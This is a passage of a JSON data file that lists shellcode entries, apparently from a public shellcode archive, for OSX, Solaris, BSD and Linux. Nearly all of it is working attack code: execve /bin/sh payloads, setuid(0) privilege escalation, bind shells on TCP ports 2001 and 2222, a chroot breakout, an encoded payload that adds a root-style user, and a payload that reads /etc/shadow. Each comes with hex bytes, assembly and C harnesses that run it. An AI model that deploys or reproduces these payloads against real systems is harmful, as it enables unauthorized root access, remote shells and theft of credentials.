\"/bin/sh\""]},
{"Title": "OSX/PPC - execve(/bin/sh,[/bin/sh],NULL) + exit() Shellcode (72 bytes)", "Author": "haphet", "Published": ": 2009-01-01", "Platform": "OSX_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-129.php", "View": null, "code": ["/*", " * [MacOSX/PowerPC]", " * Shellcode for: execve(\"/bin/sh\", [\"/bin/sh\"], NULL), exit()", " * 72 bytes", " * hophet [at] gmail.com", " * http://www.nlabs.com.br/~hophet/", " *", " */", "", "#include \"stdio.h\"", "#include \"string.h\"", "", "char shellcode[] = ", "", "\"\\x7c\\xa5\\x2a\\x79\"", "\"\\x40\\x82\\xff\\xfd\"", "\"\\x7d\\x68\\x02\\xa6\"", "\"\\x3b\\xeb\\x01\\x71\"", "\"\\x39\\x40\\x01\\x71\"", "\"\\x39\\x1f\\xfe\\xce\"", "\"\\x7c\\xa8\\x29\\xae\"", "\"\\x38\\x7f\\xfe\\xc7\"", "\"\\x90\\x61\\xff\\xf8\"", "\"\\x90\\xa1\\xff\\xfc\"", "\"\\x38\\x81\\xff\\xf8\"", "\"\\x38\\x0a\\xfe\\xca\"", "\"\\x44\\xff\\xff\\x02\"", "\"\\x60\\x60\\x60\\x60\"", "\"\\x38\\x0a\\xfe\\x90\"", "\"\\x44\\xff\\xff\\x02\"", "\"\\x2f\\x62\\x69\\x6e\"", "\"\\x2f\\x73\\x68\\x54\";", "", "int main() {", "", "\tvoid (*p)();", "\tp = (void *)&shellcode;", "\tprintf(\"Lenght: %d\\n\", strlen(shellcode));", "\tp();", "}", "/*", ".globl _main", ".text", "_main:", "        xor.    r5, r5, r5\t// r5 = NULL", "        bnel    _main", "        mflr    r11", "        addi    r31, r11, 369", "        li      r10, 369", "        addi    r8, r31, -306", "        stbx    r5, r8, r5", "        addi    r3, r31, -313", "        stw     r3, -8(r1)\t// [/bin/sh]", "        stw     r5, -4(r1)", "        subi    r4, r1, 8\t// [/bin/sh]", "        addi    r0, r10, -310\t// r0 = 59", "        .long   0x44ffff02\t// sc opcode", "        .long\t0x60606060\t// NOP", "        addi    r0, r10, -368\t// r0 = 1", "        .long   0x44ffff02\t// sc opcode", "string:\t.asciz\t\"/bin/shT\"", "*/"]},
{"Title": "OSX/x86 - execve(/bin/sh) Shellcode (24 bytes)", "Author": "haphet", "Published": ": 2009-01-01", "Platform": "OSX", "Download": "http://shell-storm.org/shellcode/files/shellcode-692.php", "View": null, "code": ["/*", "Title : OSX/x86 intel - execve(/bin/sh) - 24 bytes", "Type : Shellcode", "Author : Simon Derouineau - simon.derouineau [AT] ingesup.com", "Platform : Mac OSX/Intel. Tested on 10.6.4 Build 10F569", "", "Informations : This code has to be compiled with gcc -m32 switch  on 10.6.0+", "", "More informations : x86-64 code is more secured than x86 code on OSX platform : ", "Canaries are added, Stack and heap are non-executable, etc.", "", "Also, cat /var/db/dyld/dyld_shared_cache_x86_64.map shows that no memory can be ", "mapped with WX flags, while it's possible with x86 code ( according to  /var/db/dyld/dyld_shared_cache_i386.map).", "", "The method used here is the easier one, heap is executable in x86 applications, ", "as described in \"The Mac Hacker's Handbook\", written by Charlie Miller.", "", "The trick is to memcopy the shellcode to the heap before executing it.", "", "*/", "", "", "#include <stdio.h> ", "#include <stdlib.h> ", "#include <string.h>", "", "", "", "char shellcode[]= \t\"\\x31\\xC0\" \t\t\t// xor eax,eax", "\t\t\t\"\\x50\"\t\t\t\t// push eax", "\t\t\t\"\\x68\\x2F\\x2F\\x73\\x68\"\t\t// push dword", "\t\t\t\"\\x68\\x2F\\x62\\x69\\x6E\"\t\t// push dword ", "\t\t\t\"\\x89\\xE3\"\t\t\t// mov ebx,esp", "\t\t\t\"\\x50\\x50\\x53\"\t\t\t// push eax, push eax, push ebx", "\t\t\t\"\\xB0\\x3B\"\t\t\t// mov al,0x3b", "\t\t\t\"\\x6A\\x2A\"\t\t\t// push byte 0x2a", "\t\t\t\"\\xCD\\x80\"\t\t\t// int 0x80", "", "", "int main(int argc, char *argv[]){", "void (*f)(); ", "char *x = malloc(sizeof(shellcode));", "memcpy(x, shellcode, sizeof(shellcode));", "f = (void (*)()) x;", "f();", "}"]},
{"Title": "Solaris/SPARC - setreuid(geteuid()) + setregid(getegid()) + execve(/bin/sh) Shellcode", "Author": "Claes M. Nyberg", "Published": ": 2009-01-01", "Platform": "Solaris_SPARC", "Download": "http://shell-storm.org/shellcode/files/shellcode-385.php", "View": null, "code": ["/*", " * Solaris shellcode - setreuid(geteuid()), setregid(getegid()), execve /bin/sh", " *", " * Claes M. Nyberg 20020124", " * ,  ", " */", "", "#include ", "", "static char solaris_code[] =", "            ", "            /* geteuid() */", "    \"\\x82\\x10\\x20\\x18\"   /* mov     24, %g1              */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "    \"\\x90\\x02\\x60\\x01\"   /* add     %o1, 1, %o0          */", "", "            /* setreuid() */", "    \"\\x90\\x22\\x20\\x01\"   /* sub     %o0, 1, %o0          */", "    \"\\x92\\x10\\x3f\\xff\"   /* mov     -1, %o1              */", "    \"\\x82\\x10\\x20\\xca\"   /* mov     202, %g1             */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "", "            /* getegid() */", "    \"\\x82\\x10\\x20\\x2f\"   /* mov     47, %g1              */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "    \"\\x90\\x02\\x60\\x01\"   /* add     %o1, 1, %o0          */", "", "            /* setregid() */", "    \"\\x90\\x22\\x20\\x01\"   /* sub     %o0, 1, %o0          */", "    \"\\x92\\x10\\x3f\\xff\"   /* mov     -1, %o1              */", "    \"\\x82\\x10\\x20\\xcb\"   /* mov     203, %g1             */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "", "            /* execve(/bin/sh ..) */", "    \"\\x94\\x1a\\x80\\x0a\"   /* xor     %o2, %o2, %o2        */", "    \"\\x21\\x0b\\xd8\\x9a\"   /* sethi   %hi(0x2f626800), %l0 */", "    \"\\xa0\\x14\\x21\\x6e\"   /* or      %l0, 0x16e, %l0      */", "    \"\\x23\\x0b\\xcb\\xdc\"   /* sethi   %hi(0x2f2f7000), %l1 */", "    \"\\xa2\\x14\\x63\\x68\"   /* or      %l1, 0x368, %l1      */", "    \"\\xd4\\x23\\xbf\\xfc\"   /* st      %o2, [%sp - 4]       */", "    \"\\xe2\\x23\\xbf\\xf8\"   /* st      %l1, [%sp - 8]       */", "    \"\\xe0\\x23\\xbf\\xf4\"   /* st      %l0, [%sp - 12]      */", "    \"\\x90\\x23\\xa0\\x0c\"   /* sub     %sp, 12, %o0         */", "    \"\\xd4\\x23\\xbf\\xf0\"   /* st      %o2, [%sp - 16]      */", "    \"\\xd0\\x23\\xbf\\xec\"   /* st      %o0, [%sp - 20]      */", "    \"\\x92\\x23\\xa0\\x14\"   /* sub     %sp, 20, %o1         */", "    \"\\x82\\x10\\x20\\x3b\"   /* mov     59, %g1              */", "    \"\\x91\\xd0\\x20\\x08\"   /* ta      0x8                  */", "", "            /* exit() */", "    \"\\x82\\x10\\x20\\x01\"   /* mov     1, %g1               */", "    \"\\x91\\xd0\\x20\\x08\";  /* ta      0x8                  */", "", "", "static char _solaris_code[] =", "\t\"\\x82\\x10\\x20\\x18\\x91\\xd0\\x20\\x08\\x90\\x02\\x60\\x01\\x90\\x22\"", "\t\"\\x20\\x01\\x92\\x10\\x3f\\xff\\x82\\x10\\x20\\xca\\x91\\xd0\\x20\\x08\"", "\t\"\\x82\\x10\\x20\\x2f\\x91\\xd0\\x20\\x08\\x90\\x02\\x60\\x01\\x90\\x22\"", "\t\"\\x20\\x01\\x92\\x10\\x3f\\xff\\x82\\x10\\x20\\xcb\\x91\\xd0\\x20\\x08\"", "\t\"\\x94\\x1a\\x80\\x0a\\x21\\x0b\\xd8\\x9a\\xa0\\x14\\x21\\x6e\\x23\\x0b\"", "\t\"\\xcb\\xdc\\xa2\\x14\\x63\\x68\\xd4\\x23\\xbf\\xfc\\xe2\\x23\\xbf\\xf8\"", "\t\"\\xe0\\x23\\xbf\\xf4\\x90\\x23\\xa0\\x0c\\xd4\\x23\\xbf\\xf0\\xd0\\x23\"", "\t\"\\xbf\\xec\\x92\\x23\\xa0\\x14\\x82\\x10\\x20\\x3b\\x91\\xd0\\x20\\x08\"", "\t\"\\x82\\x10\\x20\\x01\\x91\\xd0\\x20\\x08\";", "", "int", "main(void)", "{", "    void (*code)() = (void *)_solaris_code;", "    printf(\"Shellcode length: %d\\n\", strlen(_solaris_code));", "    code();", "    return(1);", "}"]},
{"Title": "Solaris/SPARC - Bind (2001/TCP) Shell (/bin/sh) Shellcode", "Author": "ghandi", "Published": ": 2009-01-01", "Platform": "Solaris_SPARC", "Download": "http://shell-storm.org/shellcode/files/shellcode-115.php", "View": null, "code": ["!!! $Id: sparc-bind.s,v 1.1 2003/03/01 01:10:51 ghandi Exp $", "!!! Bind /bin/sh to TCP port 2001.  Calls setuid(0) so /bin/sh won't", "!!! drop privileges.  After assembly, change the third byte in the", "!!! trap instructions to 0x38 to avoid having spaces in the input so that", "!!! it may be used in an HTTP GET request.  For Solaris/SPARC.", "!!! ", "!!! \"I've come here to chew bubble-gum and kick ass...And I'm all out of", "!!! bubble gum.\"", "!!! -- Nada (Roddy Piper), \"They Live\"", "!!! ", "!!! -ghandi < ghandi@mindless.com >", "!!!", "", ".global\tbindsh", ".type bindsh,#function", "", "bindsh:\tsub\t%sp, 16, %l0\t\t! struct sockaddr sa;", "", "\tsub\t%sp, %l0, %l7;", "\tst\t%l7, [%sp - 20]\t\t! int sa_len = 16;", "", "\tsub\t%l7, 14, %o0", "\tsub\t%l7, 14, %o1", "\txor\t%l1, %l1, %o2", "\txor\t%l1, %l1, %o3\t\t! %o3 will be used as a %g0", "\tsub\t%l7, 15, %o4", "\tadd\t%l7, (230 - 16), %g1", "\tta\t8", "\txor\t%o2, %o0, %l2\t\t! s = socket(AF_INET, SOCK_STREAM, 0);", "", "\tsth\t%o1, [%sp - 16]\t\t! sa.sin_family = AF_INET;", "\tmov\t2001, %l6", "\tsth\t%l6, [%sp - 14]\t\t! sa.sin_port = 2001;", "\tst\t%g0, [%sp - 12]\t\t! sa.sin_addr.s_addr = INADDR_ANY;", "", "\txor\t%o3, %l2, %o0", "\txor\t%o3, %l0, %o1", "\txor\t%o3, %l7, %o2", "\tadd\t%l7, (232 - 16), %g1", "\tta\t8\t\t\t! bind(s, &sa, sa_len);", "", "\txor\t%o3, %l2, %o0", "\tsub\t%l7, (16 - 5), %o1", "\tadd\t%l7, (233 - 16), %g1", "\tta\t8\t\t\t! listen(s, SOMAXCONN);", "\t", "\txor\t%o3, %l2, %o0", "\txor\t%o3, %l0, %o1", "\tsub\t%sp, 20, %o2", "\tadd\t%l7, (234 - 16), %g1", "\tta\t8\t\t", "\txor\t%o3, %o0, %l3\t\t! c = accept(s, &sa, &sa_len);", "", "\txor\t%o3, %l3, %o0", "\tsub\t%l7, (16 - 9),  %o1", "\txor\t%sp, %sp, %o2", "\tadd\t%l7, (62 - 16), %g1", "\tta\t8\t\t\t! ioctl(c, I_DUP2FD, 0);", "", "\txor     %o3, %l3, %o0", "        sub     %l7, (16 - 9),  %o1", "\tadd\t%o3, 1, %o2", "\tadd\t%l7, (62 - 16), %g1", "\tta\t8\t\t\t! ioctl(c, I_DUP2FD, 1);", "", "\txor     %o3, %l3, %o0", "        sub     %l7, (16 - 9),  %o1", "\tadd\t%o3, 2, %o2", "\tadd\t%l7, (62 - 16), %g1", "\tta\t8\t\t\t! ioctl(c, I_DUP2FD, 2);", "\t", "\txor\t%sp, %sp, %o0\t\t! %o0 = 0;", "\tadd\t%o3, 23, %g1", "\tta\t8\t\t\t! setuid(0);", "\tset\t0x2f62696e, %l0\t\t! (void*)sh = '/bin';", "\tset\t0x2f736800, %l1\t\t! (void*)sh + 4 = '/sh0';", "\tsub\t%sp, 16, %o0\t\t! %o0 = '/bin/sh';", "\tsub\t%sp, 8, %o1\t\t! %o1 = {'/bin/sh', NULL};", "\txor\t%sp, %sp, %o2\t\t! %o2 = NULL;", "\tstd\t%l0, [%sp - 16]", "\tst\t%o0, [%sp - 8]\t\t! argv[0] = sh;", "\tst\t%g0, [%sp - 4]\t\t! argv[1] = NULL;", "\tadd\t%o3, 59, %g1", "\tta\t8\t\t\t! execve(sh, argv, NULL);", "\txor\t%sp, %sp, %o0\t\t! %o0 = 0;", "\tadd\t%o3, 160, %g1\t\t! %g1 = 160;", "\tta\t8\t\t\t! lwp_exit(0)"]},
{"Title": "Solaris/SPARC - Bind (/TCP) Shell Shellcode", "Author": "vlad902", "Published": ": 2009-01-01", "Platform": "Solaris_SPARC", "Download": "http://shell-storm.org/shellcode/files/shellcode-313.php", "View": null, "code": ["##", "#", "#        Name: single_bind_tcp", "#   Platforms: Solaris", "#     Authors: vlad902 <vlad902 [at] gmail.com>", "#     Version: $Revision: 1.2 $", "#     License:", "#", "#        This file is part of the Metasploit Exploit Framework", "#        and is subject to the same licenses and copyrights as", "#        the rest of this package.", "#", "# Description:", "#", "#        Single bind TCP shell.", "#", "##", "", ".globl main", "", "main:", "\tandn\t%sp, 7, %sp", "", "\tmov\t1, %o4", "\txor\t%o3, %o3, %o3", "\txor\t%o3, %o3, %o2", "\tmov\t0x02, %o1", "\tmov\t0x02, %o0", "\tmov\t0xe6, %g1", "\tta\t0x08", "", "\tst\t%o0, [ %sp - 0x08 ]", "", "#ifndef NO_NULLS", "\tset\t0x00027a68, %l0", "#else", "\tset\t0x27a68fff, %l0", "\tsrl\t%l0, 12, %l0", "#endif", "\tst\t%l0, [ %sp - 0x10 ]", "\tst\t%g0, [ %sp - 0x0c ]", "\tsub\t%sp, 16, %o1", "\tmov\t0x10, %o2", "\tmov\t0xe8, %g1", "\tta\t0x08", "", "\tld\t[ %sp - 0x08 ], %o0", "\tmov\t0x01, %o1", "\tmov\t0xe9, %g1", "\tta\t0x08", "", "\tld\t[ %sp - 0x08 ], %o0", "\txor\t%o1, %o1, %o1", "\tor\t%o1, %o1, %o2", "\tmov\t0xea, %g1", "\tta\t0x08", "", "\tst\t%o0, [ %sp - 0x08 ]", "\tmov\t3, %o2", "fcntl_loop:", "\tmov\t9, %o1", "\tsubcc\t%o2, 1, %o2", "\tmov\t0x3e, %g1", "\tta\t0x08", "", "\tbnz\tfcntl_loop", "\tld\t[ %sp - 0x08 ], %o0", "", "\txor\t%o3, %o3, %o2", "\tset\t0x2f62696e, %l0", "\tset\t0x2f736800, %l1", "\tsub\t%sp, 0x10, %o0", "\tsub\t%sp, 0x08, %o1", "\tstd\t%l0, [ %sp - 0x10 ]\t", "\tst\t%o0, [ %sp - 0x08 ]", "\tst\t%g0, [ %sp - 0x04 ]", "\tmov\t0x3b, %g1", "\tta\t0x08"]},
{"Title": "Solaris/x86 - setuid(0) + /bin/cat /etc/shadow Shellcode (61 bytes)", "Author": "John Babio", "Published": ": 2009-01-01", "Platform": "Solaris_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-769.php", "View": null, "code": ["Name = John Babio", "Twitter = 3vi1john", "", "SunOS opensolaris 10  5.11 i86pc i386 i86pc", "", "setuid(0)  /bin/cat //etc/shadow      ", "", "char code[]=", "        \"\\x33\\xc0\\x50\\x50\\xb0\\x17\\xcd\\x91\\x33\\xd2\\x52\\x68\\x61\\x64\\x6f\"", "        \"\\x77\\x68\\x63\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x65\\x74\\x8b\\xcc\\x52\\x68\"", "        \"\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x8b\\xdc\\x52\\x51\\x53\\x8b\"", "        \"\\xcc\\x52\\x51\\x53\\xb0\\x3b\\x52\\xcd\\x91\\x33\\xc0\\x50\\xb0\\x01\\xcd\\x91\";", "", "int main(int argc, char **argv)", "{", "  int (*func)();", "  func = (int (*)()) code;", "  (int)(*func)();", "}", "", "8050410 <_start>:", " 8050410:    33 c0                    xor    %eax,%eax", " 8050412:    50                       push   %eax", " 8050413:    50                       push   %eax", " 8050414:    b0 17                    mov    $0x17,%al", " 8050416:    cd 91                    int    $0x91", " 8050418:    33 d2                    xor    %edx,%edx", " 805041a:    52                       push   %edx", " 805041b:    68 61 64 6f 77           push   $0x776f6461", " 8050420:    68 63 2f 73 68           push   $0x68732f63", " 8050425:    68 2f 2f 65 74           push   $0x74652f2f", " 805042a:    8b cc                    mov    %esp,%ecx", " 805042c:    52                       push   %edx", " 805042d:    68 2f 63 61 74           push   $0x7461632f", " 8050432:    68 2f 62 69 6e           push   $0x6e69622f", " 8050437:    8b dc                    mov    %esp,%ebx", " 8050439:    52                       push   %edx", " 805043a:    51                       push   %ecx", " 805043b:    53                       push   %ebx", " 805043c:    8b cc                    mov    %esp,%ecx", " 805043e:    52                       push   %edx", " 805043f:    51                       push   %ecx", " 8050440:    53                       push   %ebx", " 8050441:    b0 3b                    mov    $0x3b,%al", " 8050443:    52                       push   %edx", " 8050444:    cd 91                    int    $0x91", " 8050446:    33 c0                    xor    %eax,%eax", " 8050448:    50                       push   %eax", " 8050449:    b0 01                    mov    $0x1,%al", " 805044b:    cd 91                    int    $0x91"]},
{"Title": "Solaris/x86 - execve(/bin/sh) Shellcode (43 bytes)", "Author": "shellcode.com.ar", "Published": ": 2009-01-01", "Platform": "Solaris_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-386.php", "View": null, "code": ["/*", " * Solaris shellcode - execve /bin/sh", " */", "", "#include ", "", "// http://www.shellcode.com.ar", "//", "// execve(//bin/sh)", "", "char shellcode[]=", "   \"\\xb8\\xff\\xf8\\xff\\x3c\"       // mov    eax, 03cfff8ffh", "   \"\\xf7\\xd0\"                   // not    eax", "   \"\\x50\"                       // push   eax", "   \"\\x31\\xc0\"                   // xor    eax, eax", "   \"\\xb0\\x9a\"                   // mov    al, 09ah", "   \"\\x50\"                       // push   eax", "   \"\\x89\\xe5\"                   // mov    ebp, esp", "   \"\\x31\\xc0\"                   // xor    eax, eax", "   \"\\x50\"                       // push   eax", "   \"\\x68\\x2f\\x2f\\x73\\x68\"       // push   dword 68732f2fh", "   \"\\x68\\x2f\\x62\\x69\\x6e\"       // push   dword 6e69622fh", "   \"\\x89\\xe3\"                   // mov    ebx, esp", "   \"\\x50\"                       // push   eax", "   \"\\x53\"                       // push   ebx", "   \"\\x89\\xe2\"                   // mov    edx, esp", "   \"\\x50\"                       // push   eax", "   \"\\x52\"                       // push   edx", "   \"\\x53\"                       // push   ebx", "   \"\\xb0\\x3b\"                   // mov    al, 59", "   \"\\xff\\xd5\";                  // call   ebp", "", "//", "", "int", "main(void)", "{", "    void (*code)() = (void *)shellcode;", "    printf(\"Shellcode length: %d\\n\", strlen(shellcode));", "    code();", "    return(1);", "}"]},
{"Title": "Linux/x86 - Add User (t00r/t00r) PexFnstenvSub Encoded Shellcode (116 bytes)", "Author": "vlad902", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-311.php", "View": null, "code": ["unsigned char scode[] =", "\"\\x29\\xc9\\x83\\xe9\\xe9\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\xfd\"", "\"\\x96\\x34\\xe4\\x83\\xeb\\xfc\\xe2\\xf4\\xcc\\x5f\\xbd\\x2f\\x97\\xd0\\x6c\\x29\"", "\"\\x7d\\xfc\\x31\\xbc\\xcc\\x5f\\x65\\x8c\\x8e\\xe5\\x43\\x80\\x95\\xb9\\x1b\\x94\"", "\"\\x9c\\xfe\\x1b\\x81\\x89\\xf5\\xbd\\x07\\xbc\\x23\\x30\\x29\\x7d\\x05\\xdc\\xc6\"", "\"\\xfd\\x96\\x34\\x90\\xcd\\xa6\\x46\\xde\\xbc\\xd7\\x6d\\xaf\\xaa\\xc0\\x5e\\xb6\"", "\"\\xb1\\xa0\\x5e\\x8f\\xb4\\xac\\x04\\xde\\xcd\\xac\\x0e\\xcb\\xc7\\xb9\\x56\\x8d\"", "\"\\x93\\xb9\\x47\\x8c\\xf7\\xcf\\xbf\\xb5\\x01\\xfc\\x30\\xbc\\x30\\x16\\x5e\\xe5\"", "\"\\xa5\\x5b\\xb4\\xe4\";"]},
{"Title": "BSD/x86 - setuid(0) + Break chroot (../ 10x Loop) + execute /bin/sh Shellcode (57 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "BSD_x86", "Download": "http://rootteam.void.ru/shellcodes/stuid_chroot_execve.c", "View": null, "code": ["/* The setuid(0)+chroot()+execve shellcode", "\t", "   it will:", "\t\t setuid(0)", "\t\t put '../' 10 times in chroot()", "\t\t execute /bin/sh", "   Size  57 bytes", "   OS\t *BSD", "  \t\t/rootteam/dev0id\t(rootteam.void.ru)", "\t\t\tdev0id@uncompiled.com ", "", "", "BITS\t32", "", "\txor\tecx,ecx", "\txor\teax,eax", "\tpush\teax", "\tmov\tal,0x17", "\tpush\teax", "\tint\t0x80", "\tpush\tecx", "\tmov\tcl,0x1e", "main_push:", "\tpush byte 0x2e", "\tloop\tmain_push", "\tmov\tcl,0x1e", "main_loop:", "\tdec\tcl", "\tinc byte [esp+ecx]", "\tdec\tcl", "\tloop\tmain_loop", "\tpush \tesp", "\tmov\tal,0x3d", "\tpush\teax", "\tint\t0x80", "", "\txor\teax,eax", "\tpush\teax", "\tpush long\t0x68732f6e", "\tpush long \t0x69622f2f", "\tmov\tebx,esp", "\tpush\teax", "\tpush\tesp", "\tpush\tebx", "\tmov\tal,0x3b", "\tpush\teax", "\tint\t0x80", "*/", "", "", "", "char shellcode[] =", "\t\"\\x31\\xc9\\x31\\xc0\\x50\\xb0\\x17\\x50\\xcd\\x80\\x51\\xb1\\x1e\\x6a\\x2e\"", "\t\"\\xe2\\xfc\\xb1\\x1e\\xfe\\xc9\\xfe\\x04\\x0c\\xfe\\xc9\\xe2\\xf7\\x54\\xb0\"", "\t\"\\x3d\\x50\\xcd\\x80\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\"", "\t\"\\x62\\x69\\x89\\xe3\\x50\\x54\\x53\\xb0\\x3b\\x50\\xcd\\x80\";", "", "", "int", "main(void)", "{", "\tint *ret;", "\tret = (int*)&ret + 2;", "\t(*ret) = shellcode;", "}"]},
{"Title": "BSD/x86 - setuid(0) + Break chroot (../ 10x Loop) + Bind (2222/TCP) Shell Shellcode (133 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "BSD_x86", "Download": "http://rootteam.void.ru/shellcodes/stuid_chroot_bind.c", "View": null, "code": ["/* The setuid(0)+chroot()+bind shellcode", "   it will:", "\t\t setuid(0)", "\t\t put '../' 10 times in chroot()", "\t\t open shell on 2222nd port", "   Size  133 bytes", "   OS\t *BSD", "  \t\t/rootteam/dev0id\t(rootteam.void.ru)", "\t\t\tdev0id@uncompiled.com ", "", "BITS\t32", "\t", "main:", "\txor\tecx,ecx", "\txor\teax,eax", "\tpush\teax", "\tmov\tal,0x17", "\tpush\teax", "\tint\t0x80", "\tpush\tecx", "\tmov\tcl,0x1e", "main_push:", "\tpush byte 0x2e", "\tloop\tmain_push", "\tmov\tcl,0x1e", "main_loop1:", "\tdec\tcl", "\tinc byte [esp+ecx]", "\tdec\tcl", "\tloop\tmain_loop1", "\tpush \tesp", "\tmov\tal,0x3d", "\tpush\teax", "\tint\t0x80", "", "\tpush byte\t0x06", "\tpush byte\t0x01", "\tpush byte\t0x02", "\tmov\tal,0x61 ", "\tpush\teax", "\tint\t0x80", "\tmov\tedx,eax", "\txor\teax,eax", "\tpush\teax", "\tpush long 0xAE0802ff", "\tmov\teax,esp", "\tpush byte\t0x10", "\tpush\teax", "\tpush\tedx", "\txor\teax,eax", "\tmov\tal,0x68", "\tpush\teax", "\tint\t0x80", "\tpush byte\t0x1", "\tpush\tedx", "\txor\teax,eax", "\tmov\tal,0x6a", "\tpush\teax", "\tint\t0x80", "\txor\teax,eax", "\tpush\teax", "\tpush \teax", "\tpush\tedx", "\tmov\tal,0x1e", "\tpush\teax", "\tint\t0x80", "\tmov\tcl,3", "\tmov\tebx,-1", "\tmov\tedx,eax", "main_loop:", "\tinc\tebx", "\tpush\tebx", "\tpush\tedx", "\tmov\tal,0x5a", "\tpush\teax", "\tint\t0x80", "\tdec\tcl", "\tjnz\tmain_loop", "\txor\teax,eax", "\tpush\teax", "\tpush long\t0x68732f6e", "\tpush long \t0x69622f2f", "\tmov\tebx,esp", "\tpush\teax", "\tpush\tesp", "\tpush\tebx", "\tmov\tal,0x3b", "\tpush\teax", "\tint\t0x80", "", "", "*/", "", "char shellcode[] =", "\t\"\\x31\\xc9\\x31\\xc0\\x50\\xb0\\x17\\x50\\xcd\\x80\\x51\\xb1\\x1e\\x6a\\x2e\"", "\t\"\\xe2\\xfc\\xb1\\x1e\\xfe\\xc9\\xfe\\x04\\x0c\\xfe\\xc9\\xe2\\xf7\\x54\\xb0\"", "\t\"\\x3d\\x50\\xcd\\x80\\x6a\\x06\\x6a\\x01\\x6a\\x02\\xb0\\x61\\x50\\xcd\\x80\"", "\t\"\\x89\\xc2\\x31\\xc0\\x50\\x68\\xff\\x02\\x08\\xae\\x89\\xe0\\x6a\\x10\\x50\"", "\t\"\\x52\\x31\\xc0\\xb0\\x68\\x50\\xcd\\x80\\x6a\\x01\\x52\\x31\\xc0\\xb0\\x6a\"", "\t\"\\x50\\xcd\\x80\\x31\\xc0\\x50\\x50\\x52\\xb0\\x1e\\x50\\xcd\\x80\\xb1\\x03\"", "\t\"\\xbb\\xff\\xff\\xff\\xff\\x89\\xc2\\x43\\x53\\x52\\xb0\\x5a\\x50\\xcd\\x80\"", "\t\"\\xfe\\xc9\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\"", "\t\"\\x62\\x69\\x89\\xe3\\x50\\x54\\x53\\xb0\\x3b\\x50\\xcd\\x80\";", "int", "main(void)", "{", "\tint *ret;", "\tret = (int*)&ret + 2;", "\t(*ret) = shellcode;", "}"]},
{"Title": "BSD/x86 - Bind (2222/TCP) Shell Shellcode (100 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "BSD_x86", "Download": "http://rootteam.void.ru/shellcodes/bind.c", "View": null, "code": ["/* The bind shellcode that opens the shell on 2222nd port", "   Size    100 bytes", "   OS\t   *BSD", "  \t\t/rootteam/dev0id\t(rootteam.void.ru)", "\t\t\tdev0id@uncompiled.com ", "", "", "BITS\t32", "\t", "main:", "\txor\teax,eax", "\tpush byte\t0x06", "\tpush byte\t0x01", "\tpush byte\t0x02", "\tmov\tal,0x61 ", "\tpush\teax", "\tint\t0x80", "\tmov\tedx,eax", "\txor\teax,eax", "\tpush\teax", "\tpush long 0xAE0802ff", "\tmov\teax,esp", "\tpush byte\t0x10", "\tpush\teax", "\tpush\tedx", "\txor\teax,eax", "\tmov\tal,0x68", "\tpush\teax", "\tint\t0x80", "\tpush byte\t0x1", "\tpush\tedx", "\txor\teax,eax", "\tmov\tal,0x6a", "\tpush\teax", "\tint\t0x80", "\txor\teax,eax", "\tpush\teax", "\tpush \teax", "\tpush\tedx", "\tmov\tal,0x1e", "\tpush\teax", "\tint\t0x80", "\tmov\tcl,3", "\tmov\tebx,-1", "\tmov\tedx,eax", "main_loop:", "\tinc\tebx", "\tpush\tebx", "\tpush\tedx", "\tmov\tal,0x5a", "\tpush\teax", "\tint\t0x80", "\tdec\tcl", "\tjnz\tmain_loop", "\txor\teax,eax", "\tpush\teax", "\tpush long\t0x68732f6e", "\tpush long \t0x69622f2f", "\tmov\tebx,esp", "\tpush\teax", "\tpush\tesp", "\tpush\tebx", "\tmov\tal,0x3b", "\tpush\teax", "\tint\t0x80", "", "*/", "", "char shellcode[] =", "\t\"\\x31\\xc0\\x6a\\x06\\x6a\\x01\\x6a\\x02\\xb0\\x61\\x50\\xcd\\x80\\x89\\xc2\"", "\t\"\\x31\\xc0\\x50\\x68\\xff\\x02\\x08\\xae\\x89\\xe0\\x6a\\x10\\x50\\x52\\x31\"", "\t\"\\xc0\\xb0\\x68\\x50\\xcd\\x80\\x6a\\x01\\x52\\x31\\xc0\\xb0\\x6a\\x50\\xcd\"", "\t\"\\x80\\x31\\xc0\\x50\\x50\\x52\\xb0\\x1e\\x50\\xcd\\x80\\xb1\\x03\\xbb\\xff\"", "\t\"\\xff\\xff\\xff\\x89\\xc2\\x43\\x53\\x52\\xb0\\x5a\\x50\\xcd\\x80\\xfe\\xc9\"", "\t\"\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\"", "\t\"\\x89\\xe3\\x50\\x54\\x53\\xb0\\x3b\\x50\\xcd\\x80\";", "int", "main(void)", "{", "\tint *ret;", "\tret = (int*)&ret + 2;", "\t(*ret) = shellcode;", "}"]},
